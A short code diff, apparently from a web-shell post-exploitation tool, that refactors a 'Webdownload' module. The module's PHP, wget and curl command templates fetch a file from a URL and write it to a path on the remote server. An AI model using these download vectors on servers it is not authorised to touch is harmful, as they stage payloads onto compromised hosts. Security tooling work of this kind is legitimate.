@@ -23,13 +23,13 @@ class Webdownload(Module):
 
         self._register_vectors(
             [
-            PhpCmd("""@file_put_contents("${args['rpath']}", file_get_contents("${args['url']}"));""",
+            PhpCmd("""@file_put_contents("${rpath}", file_get_contents("${url}"));""",
               name = "file_put_contents"
             ),
-            ShellCmd("""wget ${args['url']} -O ${args['rpath']}""",
+            ShellCmd("""wget ${url} -O ${rpath}""",
               name = "wget"
             ),
-            ShellCmd("""curl -o ${args['rpath']} ${args['url']}""",
+            ShellCmd("""curl -o ${rpath} ${url}""",
               name = "curl"
             )
             ]
@@ -50,5 +50,5 @@ class Webdownload(Module):
 
         return self.vectors.get_result(
          name = args['vector'],
-         arguments = { 'args' : args }
+         arguments = args
         )
